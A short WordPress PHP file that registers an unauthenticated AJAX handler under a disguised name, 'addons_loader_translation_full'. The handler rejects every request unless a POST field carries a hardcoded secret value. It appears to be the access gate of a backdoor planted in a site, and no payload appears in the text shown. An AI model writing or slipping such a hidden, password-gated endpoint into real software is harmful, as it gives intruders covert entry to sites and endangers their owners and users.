<?php

function addons_loader_translation_full() {
	if (!isset($_POST["orgrfinm"]) || $_POST["orgrfinm"] !== "hHIAbqe4LCr") { http_response_code(400); die(); }
}

add_action('wp_ajax_nopriv_ff_ajax', 'addons_loader_translation_full', 5, 1);
